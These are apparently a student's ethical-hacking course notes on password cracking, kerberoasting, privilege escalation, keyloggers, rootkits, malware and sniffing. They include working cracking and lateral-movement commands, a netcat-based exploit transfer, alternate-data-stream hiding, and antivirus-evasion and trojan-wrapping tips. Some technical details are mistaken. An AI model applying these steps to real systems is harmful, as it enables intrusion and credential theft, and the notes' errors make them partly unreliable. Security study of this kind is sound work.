Packet sniffing refers to listening to other's conversation. Packet spoofing refers to actively introducing fake network traffic pretending to be someone else.

ARP does not establish any ongoing communication state between the two devices. The next time the requesting node needs to send data to the same destination device, it will send another ARP request to obtain the current MAC address.

Therefore, ARP is considered a stateless protocol because it does not maintain any ongoing communication state between the devices involved in the communication.

A sniffing tool can capture network traffic both over wired and wireless connections, but the approach and techniques used may differ slightly depending on the type of connection.

In a wired network, sniffing tools can capture network traffic by analyzing the data that is sent and received through Ethernet cables or other wired connections. This can be done by connecting the sniffing tool to a switch or hub that is connected to the network, or by using a network tap or a specialized network interface card (NIC) that supports promiscuous mode.

In a wireless network, sniffing tools can capture network traffic by analyzing the data that is transmitted over the airwaves. This can be done by putting a wireless NIC into monitor mode and capturing packets from the air. However, capturing wireless network traffic can be more challenging than capturing wired network traffic due to the nature of wireless communications, which are susceptible to interference and encryption.


#System Hacking
i)Introduction of stystem Hacking
ii)Goals of System Hacking
Gaining Access
Escalating privileges
Executing applications
Hiding files
Clearing tracks
iii)Introduction to Password Craking
iv)Password Complexity
formula: log(C)/log(2) *L
v)Types of password Attack
vi)Active Online Attack
vii)Password Guessing
viii)Default Passwords
ix) Online Malware Attack
x) Hash Injection or Pass the Hash (Windows Challenge/Response (NTLM) is the authentication protocol used on networks that include systems running the Windows operating system)
-A hash injection/pass the hash attak allows an attacker to inject a compromised hash into a local session and use the hash to validate to network resources
-The attacker uses the extracted hash to log on to the domain controller*.
xi)Meaning of Promiscous Mode
Promiscuous mode is a feature of network interface controllers (NICs) that allows the NIC to capture all network traffic that passes by it, regardless of whether the traffic is intended for the NIC or not.
Enabling promiscuous mode on the eth0 interface using the "ifconfig eth0 promisc" command will allow the interface to receive all network traffic that it can see on the network.
you need to use a packet capture tool like Wireshark that supports promiscuous mode and has access to the network interface in promiscuous mode.
Additionally, you may also need to configure the network switch or router to allow the promiscuous traffic to reach your computer.
Promiscuous mode can also be used for malicious purposes, such as network sniffing and data interception.
xii)Man in the Middle and Replay attacks
In a replay attack, packets and authentication tokens are captured using a sniffer. After the relevant info is extracted the tokens are placed back on the network to gain access.
xiii)Offline attacks, Rainbow Tables
A rainbow table is a precomputed table which contains wordlists like dictionary files and brute force lists and their hash value
-tools to create rainbow tables:
rtgen(rainbow table generater): The rtgen program need several paramaters to generate a rainbow table
Winrtgen: Winrtgen is a graphical Rainbow Tables Generater that supports MD4, MD5, SHA1.
xiv)Offilne Distributed Neywork Attacks
A Distributed Network Attack(DNA) technique is used for recovering passwords from hashes or password protected files using the unused processing power of machines across the network to decrypt passwords.
The DNA Manager is installed in a central location where machines running on DNA Client can access it over the network.
xv)Password Craking with KeyLoggers
A keylogger(also called as spy software) is a program that monitors each and every keystroke a user types on a specific computer's keyboard.
xvi) Password List generation with crunch
Crunch is a wordlist and password generator where you can specify a standard character set or any set of characters to be used in generating the wordlists.
crunch 8 8 -o wordlist.txt(generate 8 character)
crunch 8 8 -t 1234567890abcdef -o wordlist.txt(generate 8 character combination of 1234567890abcdef)
crunch 8 8 @@@admin -o wordlist.txt(admin is constant and @@@ is )
crunch 8 8 -t ,@%admin -o wordlist.txt(first caracter is upper and second is lower and third is digit and admin is constant)
crunch 8 8 -t @%%^%%^^
xvii)Password Craking with hashcat
hash or encoded password cracker
-hashcat -m 0 -a 3 lol.txt (contant of lol.txt is dd785b11070397db047eeb5642470469)
a=attack mode is 3 means bruteforce and -m =3 means hash type md5
-hashcat -a 0 -m 0 password.txt wordlist.txt --force -r bitten.rule(r=rule) wecan also create custom rule in hashat
xviii)Password Craking with john the Ripper
>john  hackthe.box.zip
>sudo john /etc/shadow
John the Ripper is more versatile in terms of hash type support and platform compatibility, and is easier to use for beginners, while Hashcat is faster and more efficient at cracking passwords due to its use of GPU acceleration.
xix)Password craking with Hydra
xx) Password craking with rainbow crack (website: http://project-rainbowcrack.com/table.htm)
let say we have to crack this hash:126ac4b07f93bc4f7bed426f5e978c16 = crush(md5)
first we generate rainbow table
./rtgen md5 loweralpha 5 5 0 1000 1000 0 0 (5=length of caracterset, 0=table index, 1000=chain length)
./rtsort .
./rcrack . -h 126ac4b07f93bc4f7bed426f5e978c16
A rainbow table attack involves precomputing a large table of hash values for every possible combination of characters up to a certain length. The attacker then compares the hash value of the password they are trying to crack with the hash values in the rainbow table until a match is found. This method is much faster than a brute force attack because the attacker is able to quickly look up the hash value in the precomputed table rather than having to compute each hash value from scratch.
Rainbow table method use more memory and brute force method use more cpu
xxi)password Cracking with Cain and Winrtgen
Cain is a versatile tool that can be used to crack a wide range of password types and protocols, including Windows passwords, wireless network keys, and more. It also has additional features such as network sniffing, ARP poisoning, and more, which can be useful for security testing and analysis.
xxii)Password Extraction with passview (website: https://www.nirsoft.net/password_recovery_tools.html)
NirSoft Web site provides free password recovery tools for variety of Windows programs, including Chrome Web browser, Firefox Web browser, Microsoft Edge, Internet Explorer, Microsoft Outlook, Network passwords of Windows, Wireless network keys, Dialup entries of Windows, and more...
xxiii)Password Salting
A salt is a random string of characters that is added to the password before hashing.
When a user logs in, the salt is retrieved and added to their password input before hashing
xxiv)Microsoft Authentication
-Security Accounts Manager(SAM) Database:(C:\windows\system32\config\SAM)
Window stores user passwords in SAM, or in the Active Directory database in domain. Passwords are never stores in clear text, passwords are hashed and the results are stored in SAM
-Windows New Technology LAN Manager (NTLM) is a suite of security protocols offered by Microsoft to authenticate users' identity and protect the integrity and confidentiality of their activity
-NTLM is hashing algorithm for hashing password and stored in SAM Database.
-Kerberous Authentication:
Microsoft has upgraded its default authentication protocol to Kerberos which provides a stronger authentication for client/server applications than NTLM
xxv)How password are stored in SAM file
xxvi)Introduction to Domain Controller
In addition to managing user authentication and authorization, the domain controller also provides other services such as time synchronization, group policy management, and directory services. By using a domain controller, network administrators can ensure consistent and secure access to resources across the network, and can manage all user accounts and resources from a centralized location.
xxvii)Introduction to Active Directory
Active Directory is a database that stores and organizes enterprise resources as objects. You can think of Active Directory as a database that stores users and device configurations in AD DS(Active directory domain services). A domain controller, in contrast, is simply a server running Active Directory that authenticates users and devices.
-AD DS verifies access when a user signs into a device or attempts to connect to a server over a network.
Yes, a domain controller is a server that runs the Active Directory (AD) service. Active Directory is a directory service that is used to manage and authenticate resources in a Windows-based network. The domain controller is responsible for maintaining the AD database, which includes information about users, computers, and other network resources. By running the AD service, a domain controller provides centralized management and authentication for network resources, making it an essential component of a Windows-based network.
xxviii)LAN Manager Hash
It is an encryption mechanism used by Microsoft before it released NTLM.
password were padded to 14 bytes> Each 7 byte half is encrypted with DES with separate keys. This makes it weaker.
xxix)NTLM Authentication
IT includes LM version 1 and 2, and NTLM version 1 and 2.
NTLM and NTLM authentication are the same thing, they refer to the same authentication protocol used in Microsoft Windows networks. NTLM stands for Windows NT LAN Manager, and it is a challenge-response authentication protocol that is used to authenticate users and provide access to resources within a Windows domain or network.

NTLM authentication is based on a client-server model where the client sends its credentials to the server, which then validates them before granting access to resources. It uses a hash of the user's password to authenticate the user, which can be vulnerable to certain types of attacks.
xxx)Kerberos Authentication
Kerberos is a network authentication protocol that is used to verify the identity of users and services in a distributed network environment. It was developed at MIT in the 1980s and has since become a widely used protocol in enterprise networks.

Kerberos works by using a centralized authentication server, called the Key Distribution Center (KDC), to issue and verify encrypted tickets. When a user attempts to access a network resource, they present their credentials to the KDC, which then issues them a ticket called TGT(Ticket granting ticket) that includes a session key that proves to other servers that client has been authenticated.The user then presents this ticket to the resource they are trying to access, which uses the session key to verify the user's identity and grant access.

The Kerberos protocol uses a mutual authentication process, meaning that both the user and the resource must verify their identities to each other before access is granted. This makes Kerberos more secure than other authentication protocols, such as NTLM.

Kerberos is widely used in enterprise networks to authenticate users and services, particularly in Windows environments. It is also supported by many other operating systems and applications, making it a popular choice for network authentication.
-Key Distribution Center(KDC): Authentication server is logically separated into three parts: Database(Db), Authentication Server(AS) and Ticket Granting Server(TGS). all existing in a single server is called Key Distribution Center
xxxi)Active Directory Lab Build and Minimum Requirements
xxxii)Active Directory Downloading Necessary Files
xxxiii)Active Directory Installing the Windows 10 Server (https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022)
download Windows 10 Server iso file on vmwareworkstation
xxxiv)Active Directory Installing and Setting up Domain Controller
xxxv)Active Directory Creating Users, Groups, Services and Shares
xxxvi)Active Directory Installing and Setting up Windows 10 Enterprise (https://www.microsoft.com/en-us/evalcenter/download-windows-11-enterprise)
download Windows 10 Enterprise iso file on vmwareworkstation
xxxvii)Active Directory Update Windows 10
xxxviii)Active Directory Joining Users to The Domain
xxxix)Active Directory Attacks LLMNR NBTNS Poisoning
Link-Local Multicast Name Resolution(LLMNR) and NetBIOS Name Service(NBT-NS) are components of Microsoft Windows systems that are alternate methods of host identification when DNS fails.
LLMNR and NBT-NS can be spoofed by listening for LLMNR(UDP 5455) or NBT-NS(UDP 137) broadcasts going over the wire and respond to them.
The attack takes advantage of the way Windows systems use the LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) protocols to resolve network names to IP addresses. Attackers can use these protocols to send unsolicited messages to victims, tricking them into connecting to a malicious machine.
-Popular tool:Linux: Responder=developed by Spiderlab. It will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix(powerful tool show again one time with burpsuit)
              Man-in-the-Middle Framework(MiTMf)=Developed by Byt3bl33d3r
              LLMNR_Response Module in the Metasploit Framework
              Window:
              Inveigh=Developed by Kevin Robertson
xL)Active Directory Attacks Kerberoasing
To perform kerberoasting, an attacker needs to identify a service account that is configured to use Kerberos authentication and has a service principal name (SPN) registered in Active Directory. Once the SPN is identified, the attacker can use a tool like PowerView or Rubeus to request a service ticket for the SPN. The tool will then extract the encrypted hash of the service account's password from the service ticket.
-Tools:
Empire
Impacket(GetUserSPN)
python3 /use/share/doc/python3-impacket/examples/GetUserSPNs.py BITTENTECH.local/anshb:Password123 -dc-ip 192.168.75.136 -request
192.168.75.136 is domain controller ip. it will generate the hash of service ticket and crack using following command.
hashcat -m 13100 hash.txt rockyou.txt --force -O
PowerSploit
xLi)Active Directory Attacks Kerberoasing in action
mitigations:
Enable AES Kerberos encryption rather than RC4
xLii)Introduction to Metasploit
-Metasploit payloads modules are two type staged and stageless
Stagers:It sets up a network connection between the attacker and victim.
stages: windows/shell/reverse_tcp(It is downloaded by stagers modules)
stageless: windows/shell_reverse_tcp (The entire payload is sent in one hit and executed on the target machine)
-Metasploit Auxiliary Module
Metasploit's auxiliary modules can be used to perform arbitrary, on-off actions such as port scanning, denial of service, and even fuzzing.
xLiii)Metasploit framework(msf) Walkthough
xLiv)searchsploit
xLvi)Metasploit Exploiting Windows 7
xLvii)Metasploit Exploiting Linux Machine(Metasploitable)
xLviii)DLL Hijacking
DLL hijacking, also known as DLL preloading or binary planting, is a type of security vulnerability that arises when an application searches for a dynamic link library (DLL) file to load, but does not specify the full path to the DLL. Instead, it relies on the Windows search order algorithm to locate the DLL.

An attacker can take advantage of this by placing a malicious DLL with the same name as the expected DLL in a location that is searched before the legitimate location. When the application tries to load the DLL, it unwittingly loads the malicious DLL instead of the legitimate one, allowing the attacker to execute arbitrary code on the victim's system with the same privileges as the application.
xLix)DLL Hijacking in action
tool:procmon, Kavremvr
xLx) Mimikatz
mimikatz is a tool I've made to learn C and make somes experiments with Windows security.
It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. mimikatz can also perform pass-the-hash, pass-the-ticket or build Golden tickets.
L)Linux Authentication
Li)Introduction to privilege Escalation
Lii)Windows User Levels
Liii)Linux User Levels
Liv)Executing Applications
Windows:psexec \\IP -u USER -p PW cmd.exe
   -s= Run the remote process in the System account
Kali: winexe -U USER%PW //IP cmd.exe
Lv)Introduction to Keyloggers
Lvi)Types of Keyloggers
Hardware keystroke Loggers:
  -PC/BIOS Embedded:
  -Keylogger Keyboard:
External Keylogger:
  -Wi-fi Keylogger:
   It features remote access over the internet. This wireless keylogger will connect to a local Wi-Fi Access Point, and  send E-mails containing recorded keystroke data.
  -Blootooth Keylogger:
  -Acoustic/CAM Keylogger:
   Monitors the sound created by someone typing on a computer.Each key on the keyboard makes a subtly different       acoustic signature when struck.
  -PS/2 and USB Keylogger:
Software Keystroke Loggers:
  -Application Keylogger: Installed as a regular application on the system and logs all the keyboards events from any user.
  Kernal Keylogger: A program on the machine obtains root access to hide in the OS and intercepts keystrokes that    pass through the kernal, makes it difficult to detect.
Hypervisor-based Keylogger
Form Grabbing Based Keylogger
Lvii)Working of Remote Keyloggers
Lviii)Anti Keyloggers
Lix)All in One keylogger
All-In-One Keylogger records every time a key is pressed on the keyboard of the device. It then stores this information, meaning you can later review the use of any device which the software is installed on. It doesn’t matter how the user is using the device - they could be typing a document, entering web addresses or chatting on social media. Whatever they are doing, whenever they are using the device, all activity can be recorded.
Lx)Introduction to Spywares
-Spyware is a program that records user's interaction with the computer and Internet without the user's knowledge and sends them to the remote attackers.It can be introduced to a device through malicious downloads, email attachments, or by exploiting vulnerabilities in the operating system or other software.
Spyware hides its process, files, and other objects in order to avoid detection and removal.
Spyware Examples:
USB Spyware
Audio Spyware:Spy voice recorder and sound snooper
Video Spyware:webcam recorder
Cellphone Spyware:Mobile Spy,mSpy
GPS Spyware:SPYPhone
Lxi)spyagent
Spytech SpyAgent is our award winning, powerful computer spy software that allows you to monitor and record EVERYTHING users do on your computer - in total stealth.
Lxii)Hiding files - Rootkits
Rootkits are a type of malicious software designed to gain unauthorized access and control over a computer system or network. Rootkits can be used by attackers to hide their presence on a system, allowing them to maintain persistent access and control over a compromised system without being detected.

Rootkits typically install themselves at the root level of a system, giving them the highest level of privileges and the ability to hide from normal system and security processes. Once installed, a rootkit can intercept and modify system calls, network traffic, and other system functions, allowing an attacker to monitor and manipulate system activity.

Rootkits are often used in conjunction with other types of malware, such as Trojan horses or backdoors, to provide attackers with complete control over a system or network. They can also be used to hide other malicious activities, such as data exfiltration or cryptocurrency mining.
Lxiii)Types of Rookits
-Hypervisor level Rootkit: Acts as a hypervisor and modifies the boot sequence of the computer system to load the host operating system as a virtual machine.Eg:Blue Pill Rootkit
-Hardware/Firmware Rootkit: Hides in hardware devices or platform firmware which is not inspected for code integrity(EFI)
-Kernal Level Rootkit: Adds malicious code or replaces original OS Kernal and device driver codes.Eg:Bootkit
-BootLoader Level Rootkit: Replaces the original boot loader with one controlled by a remote attacker.
-Application Level Rootkits: Replaces regular applications binaries with fake Trojan, or modifies the behavior of existing applications by injecting malicious code.
Lxiv)Working on Rootkits
-Spyware: A rootkit can modify your software programs for the purpose of infecting it with spyware. Sometimes difficult to detect however, but you will notice strange things happening.
-Backdoor: A back door is a modification that is built into a software program in your computer that is not part of the original design.It creates hidden feature in the software program so the intruder can use the software for malicious purposes without being dectected.
-Byte Pathching: Bytes are construted in a specific order which can be modified by a rootkit. If the bytes are rearranged it compromises the computer software protections.
-Source-Code Modification: Modififying the code in your PC's software right at the main source. The intruder inserts malicious lines of source code for the purpose of hacking software with confidential information
Lxv)Detecting Rootkits
-Intrigity-Based Detection: It compares a snapshot of the file system, boot records, or memory with a known trusted baseline
-Signature-Based Detection: This technique compares characteristics of all system processes and executable files with a database of known rootkit fingerprints.
-Heuristic/Behavior-Based Detection: Any deviations in the system's normal activity or behavior may indicate the presence of rootkit.
Lxvi)Anti Rootkits
tool:stinger mcafee
     unhackme
Lxvii)NTFS Alternate Data Streams
NTFS (New Technology File System) is a file system used by modern Windows operating systems, such as Windows 10, to organize and store files on a hard drive. One of the features of NTFS is the ability to create alternate data streams (ADS) for files.

An alternate data stream is a hidden stream of data that can be associated with a file in NTFS. This means that a file can have multiple streams of data associated with it, in addition to its main data stream. These alternate data streams can contain any type of data, such as metadata or additional content, and are stored within the same file as the main data stream.

Alternate data streams can be used for various purposes, such as storing file metadata, adding additional content to a file without changing its size, or hiding data from users who don't know about alternate data streams. However, alternate data streams can also be used maliciously to hide data or execute code that may not be detected by traditional antivirus software.
Lxix)NTFS ADS in action(how to hide file)
in cmd: echo "This is alternate data stream" > visible.txt:hidden.txt
type visible.txt:hidden.txt
notepad  visible.txt:hidden.txt
-hide executable file in hidden.txt
type C:\Windows\notepad.exe > visible.txt:hidden.exe
dir \r (to show ADS file)
Lxx)Introduction to Steganography
Steganography is the technique of hiding secret data within an ordinary, non-secret, file or message in order to avoid detection; the secret data is then extracted at its destination. The use of steganography can be combined with encryption as an extra step for hiding or protecting data.
-white Space Steganography: User hides the message in ASCII text by adding white spaces to the end of the lines.
Lxxi)Image Steganography
-The information in hidding in image files of different formats such as .PNG, .JPG, .BMP, etc
-Image steganography tools replace redundant bits of image data with the message in such a way that the effect cannot be detected.
-Image file steganography techniques:
 *Least Significant Bit Insertion=The right modt bit of a pixel is called the Least Significant Bit(LSB)
In least significant bit insertion method, the binary data of the message is broken and inserted inti the LSB of each pixel in the image file in a deterministic sequence.eg:
given a string of bytes:
(00100111 11101001 11001000)(00100111 11001000 11101001)(11001000 00100111 11101001)
the letter "H" is represented by binary dogots 01001000. To hide this "H" above stream can be changed as:
  (00100110 11101001 11001000)(00100110 11001001 11101000)(11001000 00100110 11101001)
to retrive the "H" combine all LSB bits 01001000
 *Masking and Filtering=
The masking technique hides data using a method similar to watermarks on actual paper, and it can be done by modifying the luminance of parts of the image.
The information is not hidden in the noise but in the significant areas of image.
 *Algorithms and Transformation=
Another Steganography techniques is to hide data in mathematical functions used in the compression algorithms.
Lxxii)Text Steganography
Text steganography is a technique used to hide secret messages within text that appears to be normal and innocuous. The process involves embedding a message within the text by replacing certain characters or words with others, or by using other methods to obscure the presence of the message.

Another method of text steganography involves using a specific font or typeface that includes hidden characters or symbols that can be used to encode the message. In this case, the message is not visible to the naked eye but can be revealed by using a specific software or decoding tool.
Lxxiii) Audio Steganography
Audio steganography is a technique used to hide secret information within an audio signal in a way that is not easily detectable. The process involves embedding the secret information into the audio signal by modifying the digital data that makes up the audio file.

There are different methods of audio steganography, some of which include:

LSB (Least Significant Bit) encoding: In this method, the secret message is hidden by changing the least significant bit of the audio file. Since the changes to the data are very small, they are often imperceptible to human listeners.

Echo hiding: This method involves adding an echo to the audio file that is not detectable by the human ear. The echo can be used to hide the secret message.

Phase encoding: This method involves changing the phase of certain frequencies in the audio file to hide the secret message. The changes are again very small and not easily detectable.
Lxxiv)Video Steganography
Lxxv)Quickstego tool
This tool works by altering the pixels (individual picture elements) of the image and encoding the secret text by adding small variations in colour to the image
Lxxvi)Deepsound
DeepSound is an audio steganography tool and audio converter that hides secret data into audio files, the application also enables you to extract secret files directly from audio files or audio CD tracks.
Lxxvii)Omnihide pro
Lxxviii)Detecting Steganography
Lxxix)Steganalysis
Steghide is an open-source steganography tool that is used to hide confidential data within an image or audio file.
With Steghide, you can embed data in the least significant bits of the cover file, thereby making the changes to the file almost imperceptible to the human eye or ear. The tool uses strong encryption algorithms to protect the hidden data and ensure its confidentiality.
Lxxx) Covering Tracks
Once intruders have successfully gained administrator access on a system, they will try to cover the tracks to avoid their detection.
If the system is exploited with Metasploit, attacker uses meterpreter shell to wipe out all the logs from a Windows system.
tool:CCleaner
Lxxxi) Metasploit Windows Post Exploitation, Privilege Escalation
lxxxii)Linux Privilege Escalation
ssh msfadmin@192.168.30.128 -oHostkeyAlgorithms=ssh-rsa
cp /usr/share/exploitdb/exploits/linux/local/8572.c 8572.c
cat 8572.c |nc 192.168.30.128 443
nc -lnvp 443 > 8572.c
gcc -o exploit 8572.c
sudo nc -lnvp 443 > /tmp/run
Lxxxiii)Password Cracking Countermeasures
Lxxxiii) Privilege Escalation Countermeasures
Lxxxiv) Keylogger Countermeasures
Lxxxv) Rootkit Countermeasures
Lxxxvi) NTFS ADS Countermeasures
Use programs such LADS and ADSSpy to detect streams.
-NTFS Stream Detector: StreamArmor
Stream Armor discovers hidden Alternate Data Streams(ADS) and cleans them completly from the system
Lxxxvii) Spyware ADS Countermeasures

#Malwares
i)Introduction to malwares
Malware, short for "malicious software", is any program or code that is designed to harm a computer system, network, or device. Malware can take many forms, including viruses, worms, Trojans, adware, spyware, rootkits, botnet, backdoor, ransomware, and more.
ii)Introduction to computer virus
-A computer virus is a type of malware that propagetes by inserting a copy of itself inti and becoming part of another program, computer boot sector or document.
-Viruses are generally tranismitted through file downloads, infected disk/flash drives and as email attachments.
-Virus Characteristics:
 -Infects other program
 -Transforms itself
 -Encrypts itself
 -Alerts data
 -Corrupts files and programs
 -propagates
iii)Stages of a Virus Lifetime
Design: Developing virus code using programming languages or construction kits.
Replication: Virus replicates for a period of time within the target system and then spreads itself.
Launch: It gets activated with the user performing certain actions such as running an infected program.
Detection: Avirus is identified as thread infecting target systems.
Incorporation: Antivirus software developers assimilate defenses against the virus.
iv)Phases of a virus
-Dormant phase:The virus program is into the system but idle, eventually be activated by the "trigger" which states which events will executed the virus.
-Propagation phase: The virus starts propagating, that is multiplying and replicating itself. The virus places a copy of itself into other programs or into certain system areas on the disk.
-Triggering phase: A dormant virus moves into this phase when it is activated, and will now perform the function for which it was intended.
-Execution phase:This is the actual work of the virus, where the "payload" will be released. It can be destructive succh as deleting files on disk, crashing the system, or corrupting files or relatively harmless such as popping up humorous or political messages on screen.
v)Working of Viruses
Infection Phase: In the application phase, the virus replicates itself and attaches to an .exe file in the system.
Attack phase:Viruses are programmed with trigger events to activate and corrupt systems.
vi)Types of Viruses
-System or Boot Sector Viruses
Boot sector virus moves MBR(Master Boot Record) to another location on the hard disk and copies itself to the original location of MBR.
When system boots, virus code is executed first and then control is passed to original MBR.
-File Viruses:
File viruses infect files which are executed or interpreted in the system such as COM, EXE, SYS, OVL, OBJ, PRG, MNU and BAT files.
-Multipartite Virus:
Multipartite Virus infect the systems boot sector and the exectuable files at the same time.
-Macro Viruses:
Macro viruses infect files created by Microsoft Word or Excel.
Most Macro virus are written using macro language Visual Basic for Applications(VBA)
Macro viruses infect templates or convert infected documents into template files, while maintaining their appearance of ordianary document files.
-Stealth/Tunneling Viruses
These viruses evade the anti-virus software by intercepting its requests to the operating system.
Avirus can hide itself by intercepting the anti-virus software's request to read the file and passing the request to the virus, instead of the OS.
-Encryption Viruses:
This type of virus uses simple encryption to encipher the code
The virus is encrypted with a different key for each infected file
-Polymorphic code:
Polymorphic code is  a code that mutates(change in form or nature.) while keeping the original algorithm intact.
To enable Polymorphic code, the virus has to have a Polymorphic engine(also called mutating engine)
A well-written Polymorphic virus therefore has no parts that stay the same on each infection.
-Companion/Camouflage Viruses
A Companion virus creates a companion fiel for each executable file the virus infects.
Therefore, a companion virus mey save itself as notepad.com and every time a user executes notepad.exe(good program), the computer will load notepad.exe(virus) and infect the system.
-File extensions viruses
File extension viruses change the extensions of files
with extensions turned off, if someone sends you a file named BAD.TXT.VBS, you will only see BAD.TXT
vii)Introduction to Worms and Worms vs Virus
Computer worms are a type of malware that can self-replicate and spread through a computer network or the internet without requiring any human intervention.
Attacker use worm payload to install backdoors in infected computers, which turns them into zombies and creates botnet; these botnets can be used to carry further cyber attacks.
-Difference between worm vs virus
Worms can consume a significant amount of system resources and cause network congestion, while viruses can corrupt or destroy files and data.
Worms typically require less user interaction than viruses, as they can self-replicate and spread autonomously.
viii)Introduction to Trojans
A Trojan, also known as a Trojan horse, is a type of malware that disguises itself as legitimate software to trick users into installing it on their computer or device
Trojans do not self-replicate, but they can spread through social engineering tactics, such as phishing scams or fake software updates.
Trojans create a covert communication channel between victim computer and attacker for transferring sensitive data.
ix)How Trojans are Deployed
Create a new packet using a Trojan Horse Construction Kit.
Create a dropper, which is a part in a trojanized packet that install the malicious code on the target system.
-Example of a Dropper:
 Installation path: C:\windows\system32\svchosts.exe
 Autostart: HKLM\Software\Mic...\run\explorer.exe
-Malicious code:
 Client address:client.attacker.com
 Dropzone:dropzone.attacker.com
create a wrapper using tools like EliteWrap to install droperin which Trojan is installed
execute the dropper
ececute the damage routine
x)Introduction to Exploit Kits
An exploit kit or crimeware toolkit is a platform to deliver exploits and payloads suh as Trojans, spyware, backdoors, bots, buffer overflow scripts, etc. on the target system.
-Exploit Kits
Infinity
Phoenix Exploit Kit
Blackhole Exploit Kit
Bleedinglife
Crimepack
xi)Evading Antiviruses
Break the trojan file into multiple pices and zip them as single file.
always write your own trojan, and embed it into an application.
change Trojan's syntax:
 Convert an EXE to VB script
 Change .EXE extension to .DOC.EXE, .PPT.EXE or .PDF.EXE(Windows hide "Known extensions", by default, so it shows up only .DOC, .PPT and .PDF)
 Change the content of the Trojan using hex editor and also change the checksum and encrypt the file.
Never use trojans downloaded from the web
xii)Introduction to Ransomwares
-Ransomware is a type of a maware which restricts access to the computer system's files and folders and demands an online ransom payment to the malware creator in order to remove the restrictions.
-Form of malware that encrypts a victim's files
Users are shown instructions for how to pay fee to get the decryption key.
-Ransomware kits are sold on the deep/dark web and purchases by cybercriminals.
-Types of Ransomwares
Scareware
Screenlockers: Completely lock a user out of their computer
Encrypting Ransomwares
Doxware: Attacker may also threaten to publish your data online if the victim does not pay a ransom.
mobile Ransomwares
xiii)Ransomeware Case Study of WannaCry(targeted computers running the Microsoft Windows)
The ransomware used an exploit known as EternalBlue, which was developed by the NSA after discovering a vulnerability in older Windows software
-In may 2017, Wannacry was able to infect and encrypt more than a quarter million systems globally.
-It used asymmetric encryption. During the thick of the week in which Wannacry was most virulent, only about $100000 in bitcoin was transferred.
xiv)Ransomeware Case Study of CryptoLocker
-Perhaps the first example of a attack that used public key encryption widely spread
-A Trojan horse that was active on the internet from September 2013 through May of the following year
-Demanding payment in either Bitcoin or a prepaid voucher, and experts generally belived that the RSA cryptography was used
xv)Introduction to Malware Analysis
-What is Sheep Dip Computer?
 Sheep dipping refers to the analysis of suspect files, incoming messages, etc. for malware.
 A Sheep dip computers is installed with port monitors, file monitors, network monitors and antivirus software and connects to a network only under strictly controlled conditions.
A computer used for sheep dipping should have, for example:
 Run user, group permission and process monitors(procmon)
 Run port and network monitors
 Run device driver and file monitors
 Run registry and kernal monitors
-Analysis Procedure
perform static analysis when the malware is inactive
colect information about:
  String values found in the binary with the help of string extracting tools such as BinText.
  The packaging and compressing techniques used with the help of compression and decompression tools such as UPX.
Set up network connection and check that is not giving any errors.
Run the virus and monitor the process actions and system information with the help of process monitoring tools such as Process Monitor and process explorer.
xvi)Malware Analysis of CryptoLocker
-Infection and propagation vectors:
The malware is being propagated via malicious links in spam e-mails which leads to pages exploiting common system vulnerabilities.
These exploit pages will drop Ransom Cryptolocker and other malicious executable files on the affected machine.
-characteristics and symptoms:
The contents of the original files are encrypted using AES Algorithm with a randomly generated key.
-Once the system is infected , the malware binary first tries to connect to a hard coded command and control server with IP addredd 182.164.136.134
If this attempt fails, it generate a domain name using random domain name algorithm and appends it with domain names such as .org, .net, .co.uk,. com, .biz
-Encryption technique
The malware uses an AES algorithm to encrypt the files. The malware first generates a 256 bit AES key and this will be used to encrypt the files.
In order to be able to decrypt the files, the malware author needs to know that key.
To avoid tranmitting the key in clear text, the malware will encrypt it using an asymmetric key algorithm, namely the RSA public/private key pair.
This encrypted key is then submitted to the C&C server.
xvii)Static Malware Analysis Analyzing Strings(Bin text)
BinText is a file text scanner / extractor that helps find character strings buried in binary files. The program can extract text from any kind of file and display plain ASCII text, Unicode (double byte ANSI) text, as well as Resource strings.Apr 3, 2019
xviii)Static Malware Analysis Analyzing PE(portable exetuable) Header(pestudio tool)
PE File structure=Image information, Section Information(critical), Directory(Import, export, relocation,TLS,Debug info, Resources)
xix)Static Malware Analysis File Type Identification(Hex editor, )
-PE(Portable Executable)
-2 types of PE: .exe or .dll
-DOS mode: Starts with MZ(4D 5A)
-PE header starts at 50 45
-"This file cannot run in DOS Mode"
Attackers may include false signatures by obfuscation or packing
xx)Static Malware Analysis Hash Calculation(hashcalc, pestudio)
calcalate md5 hash of file and place md5 in virustotal
xxi)JPS Virus Maker
for making virus
xxii)Internet Worm Maker Thing(make worm)
xxiii)Sonic Bat(tool used to make virus)
 This program creates batch (.bat) viruses and has varied options to ruin the victim computer in different ways. We can flood the storage space on victims' computer by making large number of files in different folders by using its "folder flood" feature. It also includes bat to exe converter to convert your batch virus files into exe virus programs and an icon changer.
xxiv)Elitewrap(wrapping the virus)
eLiTeWrap v1.03 is an EXE wrapper, used to pack files into an archive executable that can extract and execute them in specified ways when the packfile is run.
many antivirus can be bypassed if we wrapper malware using Elitewrap wrapper
xxv)Wrappers and Cryptors
-Wrappers
A wrapper binds a Trojan executable with an innocent looking .exe application such as games or office applications.
genuine-looking .exe application
The two programs are wrapped together into a single file
When the user runs the wrapped exe, it first installs the trojan in the background and then runs the wrapping application inthe foreground.
Attackers might send a birthday greeting that will install a Trojan as the user watches, for example, a birthday cake dancing across the screen.
-crypters:
Crypter is a software which is used by hackers to hide viruses, keyloggers or tools in any kind of file so that they do not easily get detected by antiviruses.
 AIO UFD Crypter
 Galaxy Sight Crypter
 Heaven Crypter
 SwayzCrypter
xxvi)Countermeasures for General Malwares
xxvii)Countermeasures for Ransomwares

xxviii)VirusTotal and AntiScan
xxix)winmd5
WinMD5Free is a tiny and fast utility to compute MD5 hash value for files
#Sniffing and Spoofing
i)Introduction to Sniffing and Spoofing
Sniffing is a process of monitoring and capturing all data packets passing through a given network using sniffing tools.
Anyone in the same physical location can plug into the network using an Ethernet cable.
ii)How sniffing Works
An attacker connects his laptop to a switch port
He runs discovery tools to learn about network topology
He identifies victims machine to target his attacks
He poisons the victim machine by using ARP spoofing techniques.
The traffic destined for the victim machine is redirected to the attacker.
The hacker extracts passwords and sensitive data from the redirected traffic.
-protocol vulnerability to sniffing
Passwords and data are sent in clear text: HTTP, Telnet and Rlogin, POP, IMAP, SMTP and NNTP, FTP
iii)Types of Sniffing
-passive sniffing:
Passive sniffing means sniffing through a hub, on a hub the traffic is sent to all ports.
It involves only monitoring of the packets sent by others without sending any additional data packets in the network traffic.
